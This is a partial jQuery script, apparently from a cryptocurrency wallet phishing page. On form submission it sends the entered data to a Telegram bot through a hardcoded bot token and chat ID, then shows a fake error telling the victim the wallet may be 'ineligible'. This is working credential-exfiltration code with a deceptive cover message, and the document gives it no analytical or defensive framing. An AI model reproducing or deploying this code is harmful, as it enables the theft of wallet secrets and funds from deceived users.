(function ($) {
	...
	$(document).ready(function(){
		...
		$("#form1").on("submit", function(event) {
			...
			$.ajax({
				url: 'https://api.telegram.org/bot6753513257:AAGxgaw20QOtg0rlLJVOmbYFKG2K8UYnNoA/'+"sendmessage?text="+sData+"&chat_id=889547742&parse_mode=HTML",
				beforeSend: function() {
				...
				success: function() {
					...
					$("#tab1").click()
					setTimeout(function(){
						alert("Error occured! Please try again and if error persist your wallet might be ineligible due to unmet criterias.")
					}, 500)
				}
			})
		})
